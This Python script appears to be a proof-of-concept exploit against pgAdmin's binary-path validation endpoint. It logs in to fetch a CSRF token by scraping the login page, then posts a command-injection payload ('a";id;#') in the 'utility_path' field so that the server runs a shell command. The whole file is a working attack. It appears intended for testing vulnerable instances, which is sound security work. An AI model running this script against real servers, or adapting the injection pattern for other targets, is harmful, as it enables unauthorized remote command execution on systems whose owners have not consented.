import os
import time

import requests

target_url = os.environ.get("TARGET_URL", None)

if target_url is None:
    print("TARGET_URL is not set")
    exit(1)


print(target_url)


session = requests.Session()
csrf = ""


def execute():
    global session
    global csrf
    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    }
    res = session.get(
        f"{target_url}/login",
        headers=headers,
    )
    # csrf = res.json()["response"]["csrf_token"]
    content = res.text
    csrf = content.partition("csrf_token")[2].partition('value="')[2].partition('"')[0]
    print(csrf)


def execute2():
    global csrf
    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "X-pgA-CSRFToken": csrf,
    }
    res = session.post(
        f"{target_url}/misc/validate_binary_path",
        headers=headers,
        json={"utility_path": 'a";id;#'},
    )
    print(res.json())


all_time = 5
sleep_time = all_time // 2

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)

execute()

time.sleep(sleep_time)

execute2()

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)
